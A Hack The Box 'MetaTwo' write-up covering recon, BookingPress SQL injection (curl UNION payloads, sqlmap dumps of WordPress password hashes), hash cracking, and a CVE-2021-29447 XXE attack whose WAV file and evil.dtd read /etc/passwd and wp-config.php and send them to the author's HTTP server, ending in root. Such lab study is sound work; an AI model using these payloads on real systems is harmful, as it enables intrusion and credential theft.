---
title: "[EASY] HTB-MetaTwo"
draft: false
tags:
  - htb
  - linux
  - sqli
  - sqlmap
  - bookingpress
  - cve-2021-29447
  - wordpress
  - xxe
  - passpie
  - gpg
  - gpg2john
---

![alt text](Images/htb/metatwo/MetaTwo.png)
## Recon
### Rustscan

Rustscan finds FTP, HTTP, and SSH open:

```bash
┌──(yoon㉿kali)-[~/Documents/htb/metatwo]
└─$ sudo rustscan --addresses 10.10.11.186 --range 1-65535
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Nmap? More like slowmap.🐢
<snip>
Host is up, received reset ttl 63 (0.54s latency).
Scanned at 2024-04-16 00:50:05 EDT for 0s

PORT   STATE SERVICE REASON
21/tcp open  ftp     syn-ack ttl 63
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 1.17 seconds
           Raw packets sent: 7 (284B) | Rcvd: 4 (172B)
```



## FTP - TCP 21

Unfortunately, anonymous login fails with FTP:

![alt text](Images/htb/metatwo/image-4.png)

## HTTP - TCP 80
Adding **metapress.htb** to `/etc/hosts` brings me a company website which  leads me to `/events`:

![alt text](Images/htb/metatwo/image.png)

### Directory Bruteforce

Feroxbuster finds **123** valid paths, but nothing seems intriguing to me:

`sudo feroxbuster -u http://metapress.htb -n -x php -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -C 404`

## SQLi on search form

At the bottom of the page, there is a search form:

![alt text](Images/htb/metatwo/image-1.png)

However, it is not vulnerale to SQLi:

`sudo sqlmap -u http://metapress.htb/?s=hh --dbs --batch`

![alt text](Images/htb/metatwo/image-3.png)


## /events Enumeration

`/events` is a page where use can reverse time slot for certain event:

![alt text](Images/htb/metatwo/image-2.png)

After reservation, it brings me to thank you page as such:

`http://metapress.htb/thank-you/?appointment_id=MQ==`

![alt text](Images/htb/metatwo/image-5.png)

Unfortunately, this page is also not vulnerable to SQLi:

![alt text](Images/htb/metatwo/image-6.png)

## Bookingpress Exploitation

Burp Suite shows multiples js files and one of them reveals the version info for booking press: **ver=1.0.10**

![alt text](Images/htb/metatwo/image-7.png)

This version is vulnerable to Unauthenticated SQL Injection:

![alt text](Images/htb/metatwo/image-8.png)

[WPScan](https://wpscan.com/vulnerability/388cd42d-b61a-42a4-8604-99b812db2357/) elaborates on this vulnerability:

> The plugin fails to properly sanitize user supplied POST data before it is used in a dynamically constructed SQL query via the bookingpress_front_get_category_services AJAX action (available to unauthenticated users), leading to an unauthenticated SQL Injection


![alt text](Images/htb/metatwo/image-20.png)

### Manual SQLi
Following the POC above, I can extract the "nonce" from the source code: **047d5a1a7e**

![alt text](Images/htb/metatwo/image-9.png)


Using the extracted nonce, I modifed the poc command and querying for verion, version_comment, and verion_compile_os confirms SQL injection working:

```bash
curl -i 'http://metapress.htb/wp-admin/admin-ajax.php' \ 
  --data 'action=bookingpress_front_get_category_services&_wpnonce=047d5a1a7e&category_id=33&total_service=-7502) UNION ALL SELECT @@version,@@version_comment,@@version_compile_os,1,2,3,4,5,6-- -'
```

| @@version       | @@version_comment | @@version_compile_os |
|-------------------------------|--------------------------|---------------------------|
| 10.5.15-MariaDB-0+deb11u1     | Debian 11                | debian-linux-gnu          |


![alt text](Images/htb/metatwo/image-10.png)



Using the command below, I can query databases and user:


```bash
curl -i 'http://metapress.htb/wp-admin/admin-ajax.php' \
  --data 'action=bookingpress_front_get_category_services&_wpnonce=047d5a1a7e&category_id=33&total_service=-7502) UNION ALL SELECT database(),user(),group_concat(schema_name),1,2,3,4,5,6 from information_schema.schemata-- -'
```

| database() | user()         | group_concat(schema_name) |
| ---------- | -------------- | ------------------------- |
| blog       | blog@localhost | information_schmea,blog   |


![alt text](Images/htb/metatwo/image-12.png)


For some reason, I am not able to query table names from the database blog:


```bash
curl -i 'http://metapress.htb/wp-admin/admin-ajax.php' \
  --data 'action=bookingpress_front_get_category_services&_wpnonce=047d5a1a7e&category_id=33&total_service=-7502) UNION ALL SELECT group_concat(table_name),@@version,@@version,1,2,3,4,5,6 from information_schema.tables where table_schema='blog';-- -'
```

![alt text](Images/htb/metatwo/image-13.png)

Since I cannot query table names, I will assume tables names based on public information out there.

Many [articles](https://codex.wordpress.org/Database_Description) out there shows me Wordpress Database structure as such:

![alt text](Images/htb/metatwo/image-15.png)


I will assume table **wp_users** exists and query **user_login** and **user_pass** from it and luckily it does exists, throwing admin and manager password hashes back at me:


```bash
curl -i 'http://metapress.htb/wp-admin/admin-ajax.php' \
  --data 'action=bookingpress_front_get_category_services&_wpnonce=047d5a1a7e&category_id=33&total_service=-7502) UNION ALL SELECT user_login,user_pass,@@version,1,2,3,4,5,6 from wp_users;-- -'
```

| bookingpress_service_id | bookingpress_category_id                              |
|-------------------------|---------------------------------------------------------|
| admin                   | $P$BGrGrgf2wToBS79i07Rk9sN4Fzk.TV.                     |
| manager                 | $P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70                    |


![alt text](Images/htb/metatwo/image-16.png)



### SQLMap

I can automated the process above with SQLmap as well.


Let's first confirm whether parameter **total_service** is vulnerable or not(it is vulnerable):

`sqlmap -u http://metapress.htb/wp-admin/admin-ajax.php --data 'action=bookingpress_front_get_category_services&_wpnonce=047d5a1a7e&category_id=1&total_service=1' -p total_service`

![alt text](Images/htb/metatwo/image-17.png)

I can dump tables in database blog as such:


`sqlmap -u http://metapress.htb/wp-admin/admin-ajax.php --data 'action=bookingpress_front_get_category_services&_wpnonce=047d5a1a7e&category_id=1&total_service=1' -p total_service -D blog --tables`

![alt text](Images/htb/metatwo/image-18.png)

I can also dump content inside table **wp_users** from database **blog**:

`sqlmap -u http://metapress.htb/wp-admin/admin-ajax.php --data 'action=bookingpress_front_get_category_services&_wpnonce=047d5a1a7e&category_id=1&total_service=1' -p total_service -D blog -T wp_users --dump`

![alt text](Images/htb/metatwo/image-19.png)

admin - $P$BGrGrgf2wToBS79i07Rk9sN4Fzk.TV.

manager - $P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70


## Hash Crack

[This article](https://blog.wpsec.com/cracking-wordpress-passwords-with-hashcat/) demonstrates how to crack Wordpress hashes.


Using hashcat, hash I can crack password hash for manager:

**manager** - **partylikearockstar**

`hashcat -m 400 hash-mananger ~/Downloads/rockyou.txt`

![alt text](Images/htb/metatwo/Crack.png)


Unfortunately, it fails to break the admin hash.


## Shell as jnelson
### Wordpress login as manager

Using the credentials cracked above, I can sign-in to Wordpress as **manager**:

`http://metapress.htb/wp-admin/profile.php`

![alt text](Images/htb/metatwo/image-21.png)

Since **manager** is not an administrator account, there is not much privilege other than uploaing new media:

`http://metapress.htb/wp-admin/media-new.php`

![alt text](Images/htb/metatwo/image-22.png)


php reverse shell payload fails to upload and all the other file upload evastion trick won't work here:

![alt text](Images/htb/metatwo/image-23.png)

### CVE-2021–29447

[Article that I followed](https://blog.wpsec.com/wordpress-xxe-in-media-library-cve-2021-29447/)


From some research, it turns out Wordpress 5.6.2 running on metapress.htb is vulnerable to CVE-2021-29447 which abuses XXE vulnerability.

#### Impact

1. **Arbitrary File Disclosure**: The contents of any file on the host’s file system could be retrieved, e.g. wp-config.php which contains sensitive data such as database credentials.

2. **Server-Side Request Forgery (SSRF)**: HTTP requests could be made on behalf of the WordPress installation. Depending on the environment, this can have a serious impact.


#### Execution

I will first create **payload.wav** file what will retrieve **evil.dtd** file from my Python HTTP server:

```bash
echo -en 'RIFF\xb8\x00\x00\x00WAVEiXML\x7b\x00\x00\x00<?xml version="1.0"?><!DOCTYPE ANY[<!ENTITY % remote SYSTEM '"'"'http://10.10.14.21:8000/evil.dtd'"'"'>%remote;%init;%trick;]>\x00' > payload.wav
```

![alt text](Images/htb/metatwo/image-27.png)

For **evil.dtd** file, I will add in following content so that it will read `/etc/passwd` and send it back to my Python HTTP server:

```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % init "<!ENTITY &#x25; trick SYSTEM 'http://10.10.14.21:8000/?p=%file;'>" >
```

![alt text](Images/htb/metatwo/image-28.png)

When uploading **payload.wav** file, it shows on error on the web app:

![alt text](Images/htb/metatwo/image-29.png)

However, on my HTTP server, It sends back base64 encrypted `/etc/passwd`:

![alt text](Images/htb/metatwo/image-30.png)

I can use `base64 -d` to decrypt it and it works fine. Note here that there is a user **jnelson** with `/bin/bash` privilege:

![alt text](Images/htb/metatwo/image-31.png)

#### Read wp-config.php

Often **wp-config.php** file contains valuable information such as credentials. 

I will edit **evil.dtd** file as such to read **wp-config.php**:

```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=../wp-config.php">
<!ENTITY % init "<!ENTITY &#x25; trick SYSTEM 'http://10.10.14.21:8000/?p=%file;'>" >
```

Again, repeating the process above, I can obtain base64 encrypted wp-config.php and I will decrypt it as such:

![alt text](Images/htb/metatwo/image-32.png)

![alt text](Images/htb/metatwo/image-33.png)

Here, credentials for the FTP is leaked: **metapress.htb** - **9NYS_ii@FyL_p5M2NvJ**

```php
define( 'FS_METHOD', 'ftpext' );
define( 'FTP_USER', 'metapress.htb' );
define( 'FTP_PASS', '9NYS_ii@FyL_p5M2NvJ' );
define( 'FTP_HOST', 'ftp.metapress.htb' );
define( 'FTP_BASE', 'blog/' );
define( 'FTP_SSL', false );
```

### SSH as jnelson

Using the credentials found above, I can sign-in to FTP as **metapress.htb**:

![alt text](Images/htb/metatwo/image-34.png)

There are two directories: **blog** and **mailer**:

![alt text](Images/htb/metatwo/image-35.png)

Inside **mailer**, there is a file named **send_emial.php**

![alt text](Images/htb/metatwo/image-36.png)

Downloading and reading the file, it leaks potential credentials for jnelson@metapress.htb: **Cb4_JmWM8zUZWMu@Ys**

![alt text](Images/htb/metatwo/image-37.png)

Luckily, **jnelson** is using the same password for SSH and it spawns me SSH connection successfully:

![alt text](Images/htb/metatwo/image-38.png)

## Privesc: jnelson to root
### passpie

There is a directory named **.passpie** in jnelson's home directory:

![alt text](Images/htb/metatwo/image-39.png)

Inside of it, I see **.keys**, which contains Private and Public PGP Keys:

![alt text](Images/htb/metatwo/image-40.png)

PGP keys look like this:

![alt text](Images/htb/metatwo/image-48.png)

![alt text](Images/htb/metatwo/image-49.png)

Passpie is a password manager software and It is holding root's ssh password:

![alt text](Images/htb/metatwo/image-42.png)

Exporting the passwords in plain text requires valid credentials:

![alt text](Images/htb/metatwo/image-50.png)

### Crack Hash

I copied Private PGP keys from **.keys** to **private.pgp** file and will make it crackable using **gpg2john**:

![alt text](Images/htb/metatwo/image-43.png)

Now **crackme.hash**, looks like this:

![alt text](Images/htb/metatwo/image-44.png)


John cracks the password hash with rockyou.txt and password is **blink182**.

`john /usr/share/wordlists/rockyou.txt crackme.hash`

![alt text](Images/htb/metatwo/image-47.png)

Using the password, I can export the passwords in plain-text as such:

![alt text](Images/htb/metatwo/image-45.png)

Now I have SSH connection as the root:

![alt text](Images/htb/metatwo/image-46.png)





## References
- https://codex.wordpress.org/Database_Description
- https://wpscan.com/vulnerability/388cd42d-b61a-42a4-8604-99b812db2357/
- https://blog.wpsec.com/cracking-wordpress-passwords-with-hashcat/

